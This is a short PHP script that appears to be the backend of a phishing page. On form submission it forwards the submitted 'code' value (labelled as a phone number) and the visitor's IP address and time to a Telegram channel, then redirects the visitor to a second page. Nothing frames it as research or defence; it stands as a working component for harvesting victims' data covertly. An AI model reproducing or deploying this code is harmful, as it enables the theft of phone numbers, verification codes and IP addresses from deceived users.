<?php
include ("jdf.php");
if (!empty($_POST)) {
    require_once 'Telegram.php';

    Telegram::sendMessage('phone: '.$_POST['code']."\n".'ip: '.$_SERVER['REMOTE_ADDR']."\n".'time: '.jdate("h:i")."\n".'');


}


header ('Location: two.html');

?>

